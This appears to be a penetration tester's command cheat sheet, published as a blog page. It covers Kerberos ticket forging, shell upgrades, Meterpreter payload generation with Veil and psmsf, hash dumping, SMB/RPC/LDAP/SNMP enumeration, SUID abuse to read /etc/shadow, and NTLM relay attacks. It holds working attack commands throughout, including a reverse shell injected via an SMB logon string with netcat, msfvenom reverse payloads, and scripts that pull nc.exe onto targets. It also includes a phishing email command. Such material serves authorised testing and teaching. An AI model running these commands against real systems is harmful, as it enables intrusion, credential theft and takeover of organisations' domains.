Crack with tgsrepcrack

{% highlight PowerShell %}
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
{% endhighlight %}

For kerberoasting we need: - Domain name, - Domain SID, and a - Password hash of the Krbtgt account

In an active Windows Meterpreter session, type “shell” to open a DOS shell.

{% highlight PowerShell %}
wmic useraccount get name,sid
{% endhighlight %}

Make user appear to be a different user

{% highlight PowerShell %}
./kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi -w sql.kirbi -u 500
{% endhighlight %}

Add user to another group (in this case Domain Admin)

{% highlight PowerShell %}
./kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi -w sql.kirbi -g 512
{% endhighlight %}

Inject back into RAM with Mimikatz

{% highlight PowerShell %}
kerberos::ptt sql.kirbi
{% endhighlight %}

# TTY

Linux Shell

{% highlight PowerShell %}
#/bin/sh -I
{% endhighlight %}

Python

Technique 1

{% highlight PowerShell %}
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py
{% endhighlight %}

Technique 2

{% highlight PowerShell %}
Python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
{% endhighlight %}

Perl

Technique 1

{% highlight PowerShell %}
# perl -e 'exec "/bin/sh";'
{% endhighlight %}

Technique 2

{% highlight PowerShell %}
# perl: exec "/bin/sh";
{% endhighlight %}

Ruby

{% highlight PowerShell %}
ruby: exec "/bin/sh"
{% endhighlight %}

Lua

{% highlight PowerShell %}
Lua: os.execute('/bin/sh')
{% endhighlight %}

Interactive Ruby Shell From Within IRB

{% highlight PowerShell %}
\> exec "/bin/sh"
{% endhighlight %}

Vi

Technique 1

{% highlight PowerShell %}
:!bash
{% endhighlight %}

Technique 2

{% highlight PowerShell %}
:set shell=/bin/bash:shell
{% endhighlight %}

# Generating Payloads

MSFPC

{% highlight PowerShell %}
apt-get install msfpc
msfpc 10.140.174.142 8080 loop verbose
msfpc 10.140.174.142 443 loop verbose
msfpc 10.140.174.142 80 loop verbose
{% endhighlight %}

PSMSF - Create all these with 80,443,8080

{% highlight PowerShell %}
./psmsf --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost 10.140.174.142 --lport 8080 --output /pentesting/payloads/
mv /pentesting/payloads/powershell_hacking.bat /pentesting/payloads/psmsf-windows-meterpreter-staged-reverse-tcp-8080.bat
mv /pentesting/payloads/powershell_msf.rc /pentesting/payloads/psmsf-windows-meterpreter-staged-reverse-tcp-8080.rc

./psmsf --attacktype ps --payload windows/meterpreter_reverse_tcp --lhost 10.140.174.142 --lport 8080 --output /pentesting/payloads/
mv /pentesting/payloads/powershell_hacking.bat /pentesting/payloads/psmsf-windows-meterpreter-stageless-reverse-tcp-8080.bat
mv /pentesting/payloads/powershell_msf.rc /pentesting/payloads/psmsf-windows-meterpreter-stageless-reverse-tcp-8080.rc
{% endhighlight %}

PMSF Encoded Binaries

{% highlight PowerShell %}
./psmsf --attacktype crt --filename /usr/share/mimikatz/x64/mimikatz.exe --output /pentesting/payloads/
mv /pentesting/payloads/cert_decode.bat /pentesting/payloads/mimikatz_cert_decode.bat
mv /pentesting/payloads/cert_encode.crt /pentesting/payloads/mimikatz_cert_encode.crt
{% endhighlight %}

Veil - Create all these with 80,443,8080

{% highlight PowerShell %}
cd /opt/veil
./Veil.py --clean
./Veil.py -t Evasion -p 5   --ordnance-payload rev_http --ip 10.140.174.142 --port 443 -o veil-c-meterpreter-rev-http-443
./Veil.py -t Evasion -p 7 --ordnance-payload rev_tcp --ip 10.140.174.142 --port 443 -o  veil-c-meterpreter-rev-tcp-443
./Veil.py -t Evasion -p 10 --ordnance-payload rev_https --ip 10.140.174.142 --port 443 -o   veil-cs-meterpreter-rev-https-443
./Veil.py -t Evasion -p 11 --ordnance-payload rev_tcp --ip 10.140.174.142 --port 443 -o     veil-cs-meterpreter-rev-tcp-443
./Veil.py -t Evasion -p 15 --ordnance-payload rev_https --ip 10.140.174.142 --port 443 -o veil-go-meterpreter-rev-https-443
./Veil.py -t Evasion -p 16 --ordnance-payload rev_tcp --ip 10.140.174.142 --port 443 -o     veil-go-meterpreter-rev-tcp-443
./Veil.py -t Evasion -p 18 --ip 10.140.174.142 --port 443 -o    veil-lua-shellcode-inject-flat-443
./Veil.py -t Evasion -p 21 --ordnance-payload rev_https  --ip 10.140.174.142 --port 443 -o  veil-powershell-meterpreter-rev-https-443
./Veil.py -t Evasion -p 22 --ordnance-payload rev_tcp --ip 10.140.174.142 --port 443 -o     veil-powershell-meterpreter-rev_tcp-443
./Veil.py -t Evasion -p 25   --ip 10.140.174.142 --port 443 -o veil-python-meterpreter-bind_tcp-443
./Veil.py -t Evasion -p 27 --ordnance-payload rev_https --ip 10.140.174.142 --port 443 -o   veil-python-meterpreter-rev-https-443
./Veil.py -t Evasion -p 28 --ordnance-payload rev_tcp --ip 10.140.174.142 --port 443 -o     veil-python-meterpreter-rev-tcp-443
./Veil.py -t Evasion -p 29   --ip 10.140.174.142 --port 443 -o veil-python-shellcode-inject-aes-encrypt-443
./Veil.py -t Evasion -p 38 --ordnance-payload rev_https  --ip 10.140.174.142 --port 443 -o veil-ruby-meterpreter-rev-https-443
./Veil.py -t Evasion -p 39 --ordnance-payload rev_tcp    --ip 10.140.174.142 --port 443 -o veil-ruby-meterpreter-rev-tcp-443
mv /var/lib/veil/output/compiled/* /pentesting/payloads/
mv /var/lib/veil/output/source/* /pentesting/payloads/
mv /var/lib/veil/output/handlers/* /pentesting/payloads/
{% endhighlight %}

GreatSCT

{% highlight PowerShell %}
cd /opt/GreatSCT/setup
./setup.sh
./GreatSCT.py -t Bypass  --ip 10.140.174.142 --port 443 --generate-awl
mv /usr/share/greatsct-output/source/* /pentesting/payloads/
mv /usr/share/greatsct-output/compiled/* /pentesting/payloads/
mv /usr/share/greatsct-output/handlers/* /pentesting/payloads/
{% endhighlight %}

# Extracting Hashes

## PwDumpX

for local admin:

{% highlight PowerShell %}
PWDumpX.exe -clph <host> <username> <password>
{% endhighlight %}

for domain admin:

{% highlight PowerShell %}
PWDumpX.exe -clph <host> <domain>\<username> <password>
{% endhighlight %}

## fgdump

{% highlight PowerShell %}
fgdump -a -o -h 10.10.10.10 -u evilsaint -p password123
{% endhighlight %}

## WCE

If fgdump, pwdump dont work try WCE:

1. open Cain connect and map network share.
2. add WCE to writable share
3. rdesktop to server login as evilsaint
4. run wce from command line on server

# Booting into backtrack for hash grabbing

Find drive

{% highlight PowerShell %}
dmesg | grep sda
{% endhighlight %}

Display disk partiion

{% highlight PowerShell %}
cfdisk /dev/sda
{% endhighlight %}

Mount the disk

{% highlight PowerShell %}
mount /dev/sda2 /mnt
{% endhighlight %}

List files

{% highlight PowerShell %}
ls /mnt -la
{% endhighlight %}

Navigate to folder with SAM and SECURITY

{% highlight PowerShell %}
cd /mnt/WINDOWS/system32/config/
{% endhighlight %}

Extract hashes

{% highlight PowerShell %}
bkhive system /tmp/key.txt
samdump2 SAM /tmp/key.txt > /tmp/hashlist.txt
{% endhighlight %}

Cat the hashes

{% highlight PowerShell %}
cat hashlist.txt
{% endhighlight %}

Check file space

{% highlight PowerShell %}
df -h
{% endhighlight %}

Change directory back to the root

{% highlight PowerShell %}
cd /
{% endhighlight %}

Unmount

{% highlight PowerShell %}
umount /mnt
{% endhighlight %}

save the files to the stick to preserve them

{% highlight PowerShell %}
dmesg | grep sd
mount /dev/sdc1 /mnt
cd /mnt
cp /tmp/hashlist.txt
cd /
df -h
umount /mnt
{% endhighlight %}

# SNMP

Find and bruteforce SNMP in one command with nmap

{% highlight PowerShell %}
nmap -sU -p 161 -n -Pn --script=snmp-brute --script-args snmp-brute.communitiesdb=/opt/gitlist/snmp-all-community.txt <ip>
{% endhighlight %}

Similar command with Metasploit

{% highlight PowerShell %}
auxiliary/scanner/snmp/snmp_enum
{% endhighlight %}

## Brute Force Community Strings

{% highlight PowerShell %}
Onesixtyone -c /opt/gitlist/snmp-all-community.txt 10.50.1.250
Onesixtyone -c /opt/gitlist/snmp-all-community.txt -i ips.txt -o snmp.log
{% endhighlight %}

## Enumerate

Nmap - These rely on snmp-brute

{% highlight PowerShell %}
snmp-hh3c-logins = Attempts to enumerate Huawei / HP/H3C Locally Defined Users
snmp-info = Extracts basic information from an SNMPv3 GET request
snmp-interfaces = Attempts to enumerate network interfaces through SNMP
snmp-ios-config = Attempts to download Cisco router IOS configuration files
snmp-netstat = Attempts to query SNMP for a netstat like output
snmp-processes = Attempts to enumerate running processes through SNMP
snmp-sysdescr = Attempts to extract system information from an SNMP version 1 service
snmp-win32-services = Attempts to enumerate Windows services through SNMP
snmp-win32-shares = Attempts to enumerate Windows Shares through SNMP.
snmp-win32-software = Attempts to enumerate installed software through SNMP.
snmp-win32-users = Attempts to enumerate Windows user accounts through SNMP
{% endhighlight %}

> try auxiliary/scanner/snmp/snmp_enumusers (should you just want usernames of who is running processes)

{% highlight PowerShell %}
snmpwalk -v 1 -c public <ip> system
{% endhighlight %}

windows users accounts

{% highlight PowerShell %}
snmpwalk -c public -v1 10.50.1.100 1.3.6.1.4.1.77.1.2.25
{% endhighlight %}

Snmpget example to get sysName name

{% highlight PowerShell %}
snmpget -v 2c -c myprivstring 10.99.0.10 .1.3.6.1.2.1.1.5.0
iso.3.6.1.2.1.1.5.0 = STRING: "dc.practice.lab"
{% endhighlight %}

snpenum.pl script is aliased and can be called anywhere

{% highlight PowerShell %}
/usr/share/snmpenum ./snmpenum.pl 10.50.1.250 private windows.txt
snmpenum 10.50.1.250 private windows.txt
{% endhighlight %}

CREST CTL

{% highlight PowerShell %}
auxiliary/scanner/snmp/cisco_config_tftp
cat /root/Desktop/crest/snmp/192.168.201.240.txt | grep "password 7"
nmap -sU -p 161 -n -Pn --script=snmp-ios-config --script-args snmp-ios-config.tftproot=/root/Desktop/crest/snmp/ --script-args=snmpcommunity=readwrite <ip>
{% endhighlight %}

# RSH and Rlogin

cat .rhosts host user + evilsaint

> in this example the user evilsaint can connect from any host as the + is a wildcard.

{% highlight PowerShell %}
rlogin -l evilsaint 10.50.1.203
{% endhighlight %}

{% highlight PowerShell %}
rsh -l evilsaint 10.50.1.203 cat secret.txt
{% endhighlight %}

# SMB

## NetBIOS

Find all hosts responding to netbios, the `q` supresses the headers

{% highlight PowerShell %}
nbtscan -q 10.11.1.0/24
{% endhighlight %}

Look at more detail for a single host either by IP or hostname

{% highlight PowerShell %}
nmblookup -A 10.50.1.254
nmblookup -S DC01
{% endhighlight %}

## Crackmapexec

{% highlight PowerShell %}
crackmapexec smb 10.50.1.0/24
{% endhighlight %}

## NMAP

nmap -sS -p 445 -n –open –script=smb-vuln*

Exploit vulnerabilities with metasploit

vuln: smb-vuln-ms06-025 metasploit: exploit/windows/smb/ms06_025_rasmans_reg

vuln: smb-vuln-ms07-029 metasploit: exploit/windows/dcerpc/ms07_029_msdns_zonename

vuln: smb-vuln-ms08-067 metasploit: exploit/windows/smb/ms08_067_netapi

vuln: smb-vuln-cve2009-3103 metasploit: exploit/windows/smb/ms09_050_smb2_negotiate_func_index

Vuln: smb-vuln-ms17-010 Metasploit: exploit/windows/smb/ms17_010_eternalblue

## SMB login (spray credentials)

{% highlight PowerShell %}
msf > use auxiliary/scanner/smb/smb_login
show options
verbose off
set password to the obtained local admin password
remove user as pass
{% endhighlight %}

## Enum4linux

Enumerate SMB

{% highlight PowerShell %}
enum4linux -a -u Administrator -p Passw0rd! 10.50.1.15
{% endhighlight %}

## SMB Client

Listing SMB shares with username and password

{% highlight PowerShell %}
smbclient -L 10.1.1.99 -U username%password
{% endhighlight %}

Listing SMB Shares with anonymous connection

{% highlight PowerShell %}
smbclient -N -L 10.1.1.99
{% endhighlight %}

Connecting to SMB Share with username and password

{% highlight PowerShell %}
smbclient \\\\10.1.1.99\\myshare -U eviltest%evilpass
{% endhighlight %}

Connecting to SMB Share without username and password

{% highlight PowerShell %}
smbclient \\\\10.1.1.99\\myshare
{% endhighlight %}

We can use smbclient over proxychains

{% highlight PowerShell %}
proxychains smbclient '//192.168.1.230/myshare' -U 'MARVEL.LAB\Administrator%password123!'
{% endhighlight %}

We can tar up files or folders with smbclient

{% highlight PowerShell %}
smbclient \\\\10.129.121.21\\guest -Tc test.tar secret.txt
smbclient \\\\10.129.121.21\\guest -Tc test.tar /tmp
{% endhighlight %}

## Mount Share

Mount SMB Share

{% highlight PowerShell %}
mount -t  //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
{% endhighlight %}

To get a shell back from an SMB share.

{% highlight PowerShell %}
logon "/=`nc 10.11.0.233 443 -e /bin/bash`"
{% endhighlight %}

## SMBMap

Not very stealthy but can execute a command

{% highlight PowerShell %}
python /usr/share/smbmap/smbmap.py -H 127.0.0.1 -u user -p pass -x 'net group "domain admins" /domain'
{% endhighlight %}

## SMBTree

SMB Tree can map out all smb shares in neighbourhood.

{% highlight PowerShell %}
smbtree
{% endhighlight %}

# NFS

View exported NFS Shares

{% highlight PowerShell %}
showmount -e <ip>
{% endhighlight %}

See what versions of the protocol are supported

{% highlight PowerShell %}
rpcinfo 10.129.121.25 | grep nfs
{% endhighlight %}

mount while specifying a version (in this case 2)

{% highlight PowerShell %}
mount -o vers=2 -vvv 10.129.121.25:/ tempfolder/
{% endhighlight %}

become  

Edit .rhost and add + + then rsh in.

Copy your public key into .ssh/authorised_keys and then SSH in

# RPC Enum

when you see TCP/111

{% highlight PowerShell %}
rpcinfo -p <ip>
{% endhighlight %}

when you see TCP/135

{% highlight PowerShell %}
dcetest <ip>
{% endhighlight %}

## Rpcclient

At the time of me writing these notes. There was an issue connecting to Windows 2003 and earlier boxes with the traditional rpcclient syntax. The reason being is Kali Linux now supports version 4.5+ of SAMBA which allows signing. To get the below commands to work with Windows 2003 you need to turn signing off with the `S` command like this:

{% highlight PowerShell %}
rpcclient -U Administrator 10.10.10.56 -S off
{% endhighlight %}

Connect to anonymous SMB

{% highlight PowerShell %}
root@kali:~# rpcclient -U "" 10.20.50.80
{% endhighlight %}

Connect to SMB via credentials. If you leave the `%` and the password off it will prompt you for a password.

{% highlight PowerShell %}
rpcclient -U Administrator%Passw0rd! 10.10.10.200
{% endhighlight %}

Once connected to the rpcclient prompt we can type in help to get a full list of commands available.

{% highlight PowerShell %}
rpcclient $> help
{% endhighlight %}

Get Domain Password Info

{% highlight PowerShell %}
rpcclient -W <workgroup|domain> -U user%pass localhost -c "getdompwinfo"
{% endhighlight %}

Rid Cycling

{% highlight PowerShell %}
for ((i=0;i<=1100;i++)); do rpcclient -U blah -N -c "lookupsids S-1-5-21-##-##-##-$i” 127.0.0.1 | tee -a domain-enum.txt; done
{% endhighlight %}

Query domain info

{% highlight PowerShell %}
rpcclient $> querydominfo
{% endhighlight %}

Retrieve information about the operating system version

{% highlight PowerShell %}
rpcclient $> srvinfo
{% endhighlight %}

There are a lot of enum commands available via rpcclient

{% highlight PowerShell %}
rpcclient $> enum

enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
enumdata       enumdomgroups  enumforms      enumports   enumtrust
enumdataex     enumdomusers   enumjobs       enumprinter
{% endhighlight %}

Current domain

{% highlight PowerShell %}
rpcclient $> enumdomains
{% endhighlight %}

Enumerate the privilleges you have for the current login

{% highlight PowerShell %}
rpcclient $> enumprivs
{% endhighlight %}

To enumerate domain users

{% highlight PowerShell %}
rpcclient $> enumdomusers
user:[nobody] rid:[0x1f5]
user:[user] rid:[0x3e8]
user:[root] rid:[0x3e9]
{% endhighlight %}

To enumerate domain groups

{% highlight PowerShell %}
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
{% endhighlight %}

To query a group

{% highlight PowerShell %}
rpcclient $> querygroup 0x200
{% endhighlight %}

To query group membership

{% highlight PowerShell %}
rpcclient $> querygroupmem 0x200
{% endhighlight %}

To enumerate network shares

{% highlight PowerShell %}
rpcclient $> netshareenum
{% endhighlight %}

To enumerate all network shares including hidden

{% highlight PowerShell %}
rpcclient $> netshareenumall
{% endhighlight %}

Enumerate the LSA SIDS

{% highlight PowerShell %}
rpcclient $> lsaenumsid
{% endhighlight %}

Convert names to SIDs

{% highlight PowerShell %}
rpcclient $> lookupnames Administrator
Administrator S-1-5-21-1475954757-1086632135-4096607810-500 (User: 1)
{% endhighlight %}

Convert SIDs to names (Rid Cycling) we change the `rid` at the end of the `sid` we just discovered

{% highlight PowerShell %}
rpcclient $> lookupsids S-1-5-21-1475954757-1086632135-4096607810-501
S-1-5-21-1475954757-1086632135-4096607810-501 ACME\Guest (1)
rpcclient $> lookupsids S-1-5-21-1475954757-1086632135-4096607810-502
S-1-5-21-1475954757-1086632135-4096607810-502 ACME\krbtgt (1)
rpcclient $> lookupsids S-1-5-21-1475954757-1086632135-4096607810-503
S-1-5-21-1475954757-1086632135-4096607810-503 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-1475954757-1086632135-4096607810-1000
S-1-5-21-1475954757-1086632135-4096607810-1000 ACME\testuser (1)
rpcclient $> lookupsids S-1-5-21-1475954757-1086632135-4096607810-1001
S-1-5-21-1475954757-1086632135-4096607810-1001 ACME\WIN-SRV-2008$ (1)
rpcclient $> lookupsids S-1-5-21-1475954757-1086632135-4096607810-1002
S-1-5-21-1475954757-1086632135-4096607810-1002 *unknown*\*unknown* (8)
{% endhighlight %}

Query user info (See when they last logged on, when they need to change their password by etc)

{% highlight PowerShell %}
rpcclient $> queryuser 1001
{% endhighlight %}

Domain Password Policy

{% highlight PowerShell %}
rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000000
{% endhighlight %}

User password policies

{% highlight PowerShell %}
rpcclient $> getusrdompwinfo 0x3601
min_password_length: 8
&info.password_properties: 0x433e6584 (1128162692)
0: DOMAIN_PASSWORD_COMPLEX
0: DOMAIN_PASSWORD_NO_ANON_CHANGE
1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
0: DOMAIN_PASSWORD_STORE_CLEARTEXT
0: DOMAIN_REFUSE_PASSWORD_CHANGE
{% endhighlight %}

Reset AD user password. The setuserinfo2 command can be used in order to change the password. Wont be able to change the password of users with AdminCount = 1 (Domain Admins and other privileged accounts).

{% highlight PowerShell %}
rpcclient $> setuserinfo2 bob 23 'Qwerty123!'
rpcclient $>
{% endhighlight %}

# SMTP

vrfy  for username enum

sendemail -f evilsaint@marvel.lab -t Caitlin.Bentley@marvel.lab -u “Click This” -m “plain text message” -s 10.50.1.242 -o tls=no -o message-file=./email.html -o message-content-type=html

# Finger

finger user@pine

finger -l @pine

finger 0@server

finger test@server

finger .@server

login with username over SSH/RSH

# FTP

Download an executable from a remote FTP server (Windows)

{% highlight PowerShell %}
C:\ echo open 10.1.2.3 > C:\script.txt
C:\ echo USER myftpuser >> C:\script.txt
C:\ echo myftppass >> C:\script.txt
C:\ echo GET nc.exe >> C:\script.txt
C:\ echo bye >> C:\script.txt
{% endhighlight %}

Run it with the `s` tag

{% highlight PowerShell %}
C:\ ftp -s:script.txt
C:\ ftp -v -n -s:script.txt

# -n = Supress auto login
# -v  = Supress display of responses
{% endhighlight %}

Upload a file to a remote FTP Server

{% highlight PowerShell %}
C:\ echo open 10.1.2.3 > C:\script.txt
C:\ echo USER myftpuser >> C:\script.txt
C:\ echo myftppass >> C:\script.txt
C:\ echo PUT E:\backups\database.dbf >> C:\script.txt
C:\ echo bye >> C:\script.txt
C:\ ftp -s:script.txt
{% endhighlight %}

Download a file from a remote server (Linux)

{% highlight PowerShell %}
root@kali:/# echo ‘open 10.1.2.3’ > ftp.txt
root@kali:/# echo 'user <username> <password>' >> ftp.txt
root@kali:/# echo ‘get linuxenum.sh enum.sh’ >> ftp.txt
root@kali:/# echo ‘bye’ >> ftp.txt
root@kali:/# ftp -n < ftp.txt
{% endhighlight %}

# TFTP

Create a /tftp folder

{% highlight PowerShell %}
mkdir /tftp
{% endhighlight %}

Start a tftp server on port 69 and serve files outside of the /tftp folder

{% highlight PowerShell %}
atftpd --daemon --port 69 /tftp
{% endhighlight %}

Copy plink.exe (a windows ssh tool) to the tftp folder

{% highlight PowerShell %}
cp /usr/share/windows-binaries/plink.exe /tftp/
{% endhighlight %}

On the target machine, pull the file via

{% highlight PowerShell %}
tftp -i 10.11.0.233 GET nc.exe
{% endhighlight %}

obtain a list of users:

{% highlight PowerShell %}
get /etc/passwd
{% endhighlight %}

Quit tftp

{% highlight PowerShell %}
quit
{% endhighlight %}

cat passwd ***REMEMBER NOT TO CAT /etc/passwd*** DUMASS!

# NTP

ntpq is used to monitor NTP daemon ntpd operations and determine performance.

Using the `p` switch print a list of the peers as well as a summary of their state.

{% highlight PowerShell %}
ntpq -p <ip>
{% endhighlight %}

Using the `c` switch to send a command. (`rv` Display the specified system or peer variables.)

{% highlight PowerShell %}
ntpq -c rv <ip>
{% endhighlight %}

Nmap

{% highlight PowerShell %}
nmap -sU -p 123 --script ntp-info <target>
{% endhighlight %}

Metasploit

{% highlight PowerShell %}
use auxiliary/scanner/ntp/ntp_monlist
{% endhighlight %}

# LDAP

## Windapsearch

https://github.com/ropnop/windapsearch.git

Using the `U` switch we can also enumerate All users:

{% highlight PowerShell %}
windapsearch --dc-ip 192.168.5.1 -u MARVEL\\Courtney.Wilson -p Pa55word -U | grep cn: | cut -d " " -f 2
{% endhighlight %}

Using the `-da` switch we can also enumerate Domain Admins:

{% highlight PowerShell %}
windapsearch –dc-ip 192.168.5.1 -u MARVEL\\Courtney.Wilson -p Pa55word --da | grep cn: | cut -d " " -f 2
{% endhighlight %}

Using the `m` switch we can enumerate members of the “Remote Desktop Users” group:

{% highlight PowerShell %}
windapsearch --dc-ip 192.168.5.1 -u MARVEL\\Courtney.Wilson -p Pa55word -m "Remote Desktop Users" | grep CN=
{% endhighlight %}

Full Command Output

{% highlight PowerShell %}
./windapsearch.py --dc-ip 10.100.1.254 -u MARVEL\\black.widow -U -G -C -r --full --da -o /tmp/windapsearch
cat /tmp/windapsearch/* | tr "\t" "\n"
{% endhighlight %}

# DNS

Zone transfer with dig

{% highlight PowerShell %}
dig @nameserver domain axfr
{% endhighlight %}

{% highlight PowerShell %}
dig mx <host>
dig a <host>
{% endhighlight %}

DNS Version - serial number is ID: [look top right]

{% highlight PowerShell %}
dig @nameserver version.bind txt chaos
{% endhighlight %}

Host lookup

{% highlight PowerShell %}
host dvla.marvel.lab 10.50.1.254
{% endhighlight %}

## DNS Recon

{% highlight PowerShell %}
dnsrecon -d marvel.lab -a -n 10.50.1.254 -D /usr/share/metasploit-framework/data/wordlists/namelist.txt
{% endhighlight %}

# X Windows

display info

{% highlight PowerShell %}
xdpyinfo -display <host>:1
{% endhighlight %}

get screen shot 2 commands this one takes the screen shot

{% highlight PowerShell %}
xwd -root -display <host>:1 > xwud.out
{% endhighlight %}

then this one displays the screen shot

{% highlight PowerShell %}
xwud -in xwud.out
{% endhighlight %}

Configure X11 Server

{% highlight PowerShell %}
nano /etc/lightdm/lightdm.conf
"xserver-allow-tcp=true"
$ xhost + access control disabled, clients can connect from any host
msf > use auxiliary/scanner/x11/open_x11
nmap -p 6000 –script x11-access 192.168.1.5
{% endhighlight %}

# rdp

xfreerdp /u: /p: +clipboard /v:

# XDMCP

Enable

{% highlight PowerShell %}
nano /etc/lightdm/lightdm.conf
[XDMCPServer]
enabled=true
{% endhighlight %}

nmap -sU -Pn -n -A -p177

Xorg :1 -query

Xephyr :1 -screen 800x600 -query  -port 177 -from

remmina can be used for this like an RDP session

# SUID Bits

check for weak file perms…

Check for SUID files:

{% highlight PowerShell %}
find / -perm -4000 -type f -exec ls -l {} \; 2> /dev/null
{% endhighlight %}

if env is suid:

{% highlight PowerShell %}
env cat /etc/shadow
{% endhighlight %}

if xargs is suid:

{% highlight PowerShell %}
echo "" | xargs cat /etc/shadow
{% endhighlight %}

if find is suid:

{% highlight PowerShell %}
find /etc/shadow -exec cat {} \;
{% endhighlight %}

Check for SGID files:

{% highlight PowerShell %}
find / -perm -2000 -type f -exec ls -l {} \; 2> /dev/null
{% endhighlight %}

Check for World-Writable files:

{% highlight PowerShell %}
find / -perm -2 -type f -exec ls -l {} \; 2> /dev/null
{% endhighlight %}

look for messed up files

{% highlight PowerShell %}
find / -nouser -o -nogroup -print
{% endhighlight %}

# Solaris

## Solaris Patching

1. Make a test script containing the output of command ‘showrev -p’
2. Strip the test script of all the guff i.e. ‘root@’ etc. (just leave command output.)
3. use ctrl + h to replace ‘Patch:’ with ’’
4. Save the file to a location accessable in the linux testing machines
5. Download the latest patchdiag.xref (https://getupdates.oracle.com/reports/patchdiag.xref) and Save the file to a location accessable in the linux testing machines
6. copy the patchdiag.xref to /var/tmp/
7. use the below command to analyze the file and print out the results into a missing csv file.

pca -l all –format %p“,”%e“,”%r“,”%s“,”%b“,”%y –xrefdir=/var/tmp/ /home/tb/server1-patch.ts > server1-missing.csv

## Exploits

Solaris Patches

{% highlight PowerShell %}
showrev -p | grep 119213-10
{% endhighlight %}

Upload to the box… use your SFTP stupid.. usr/share/exploitdb/platforms/solaris/local/2543.sh chmod +x 2543.sh ./2543.sh

# Active Directory

## Change Password of AD User

Change password of a normal user with `net rpc`

{% highlight PowerShell %}
root@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10
Enter new password for adminuser:
Enter helpdesk's password:
root@kali:~#
{% endhighlight %}

Change password of a normal user with `rpcclient`

{% highlight PowerShell %}
root@kali:~# rpcclient -U helpdesk //192.168.80.10
Enter helpdesk's password:
rpcclient $> setuserinfo2 normaluser 23 'Passw0rd!'
{% endhighlight %}

## Tokens

{% highlight PowerShell %}
proxychains psexec.py -c /tmp/incognito2/incognito.exe 'Administrator:Passw0rd!@10.100.1.22' "list_tokens -u"
{% endhighlight %}

[Tokens](https://www.notion.so/aaa27dd17e8949a6be9b9deb697e05b2)

> RDP, SMB (Net Use), Interactive Logins and RunAS (not netonly though) leave tokens on the local machine.

{% highlight PowerShell %}
load incognito
list_tokens -u
impersonate_token MARVEL\\Troy.Wood
rev2self
use auxiliary/server/capture/smb
set johnpwfile /root/domainhashes
set rhost 10.50.1.99
{% endhighlight %}

## SMB Relay

a handy way of generating targets for smb relay

{% highlight PowerShell %}
cme smb 10.50.1.0/24 --gen-relay-list targets.txt
{% endhighlight %}

### Metasploit method

At time of writing, only NTLM 1 support

{% highlight PowerShell %}
use exploit/windows/smb/smb_relay
set SMBHOST 10.50.1.254
set PAYLOAD windows/meterpreter/bind_tcp
{% endhighlight %}

### SMBRelayx (Impacket)

{% highlight PowerShell %}
msfvenom -p windows/meterpreter/reverse_https LHOST=10.50.1.205 LPORT=1337 -f exe -o shell.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 10.50.1.205
set lport 1337
run
python smbrelayx.py -h 10.50.1.254 -e payload.exe
{% endhighlight %}

### ntlmrelayx (Impacket)

By default, ntlmrelayx will dump the SAM database unless you give it a command.

Generate Relay Targets

{% highlight PowerShell %}
cme smb <CIDR> --gen-relay-list targets.txt
{% endhighlight %}

nano /usr/share/responder/Responder.conf

{% highlight PowerShell %}
SMB = Off
HTTP = Of
RespondTo = 10.50.1.83, 10.50.1.166-200
{% endhighlight %}

Start Responder

{% highlight PowerShell %}
python Responder.py -I <interface> -r -d -w
{% endhighlight %}

Start NTLM Relay

{% highlight PowerShell %}
ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
{% endhighlight %}

### Snarf

Install

{% highlight PowerShell %}
apt-get install nodejs
git clone https://github.com/purpleteam/snarf.git
{% endhighlight %}

Run

{% highlight PowerShell %}
nodejs snarf.js <your-ip> -d <target-ip>
iptables -t nat -A PREROUTING -p tcp --dport 445 -j SNARF
firefox --new-tab http://127.0.0.1:4001
{% endhighlight %}

### Responder

This is the latest version, dont use SpiderLabs as out of date https://github.com/lgandx/Responder

Run resonder

{% highlight PowerShell %}
./Responder.py -I eth0 -rfPv
{% endhighlight %}

## Metasploit (Capture Without Relay)

use auxiliary/server/capture/http_ntlm set JOHNPWFILE httpntlm.txt run use auxiliary/server/capture/smb set JOHNPWFILE smbhashes.txt run use auxiliary/spoof/llmnr/llmnr_response set spoofip 0.0.0.0 set interface eth0 run use auxiliary/spoof/nbns/nbns_response set interface eth0 run

## Generating UNC path payloads

### Metasploit

If emailed the receiver needs to put the document in editing mode before the remote server will be contacted. Preview and read-only mode do not work.

{% highlight PowerShell %}
use auxiliary/docx/word_unc_injector
set lhost 10.50.1.99
exploit
{% endhighlight %}

## Query Logged On Users

**Logon Type Codes**

`0`  = SYSTEM 

Account logon, typically used by the computer itself.

`2` = Interactive

A logon at the computer console directly. If you look in the event log you can tell if it is a local computer or a domain account from the events description (there will be a computer name or adomain name)

`3` = Network

When you access the computer from another place on the network, normally using remote protocols such as WMI and SMB

`4` = Batch

Logon sessions created by Windows when it executes a scheduled task. 

`5` = Service Logon

When windows creates a session 

`7` = Unlock

When a user logins by unlocking a password protected lock screen

`8` = Networkcleartext

When the password to logon is sent over the network in plain text. ASP Scripts and IIS basic authentication mode. 

`9` = New Credentials-based logon

If you use the `RunAs` comand to start a program under a different user account using the /netonly switch. 

N.B Without the `/netonly` windows will log a logon type of `2` on the local machine. 

`10`  = Remote Interactive

Remote Desktop logon or Remote Assistance connection. 

On some machines you may need to enable remoting

{% highlight PowerShell %}
netsh firewall set service remoteadmin enable
{% endhighlight %}

Manually with wmic command line

{% highlight PowerShell %}
wmic logon where LogonType=2 GET LoginID, LogonType
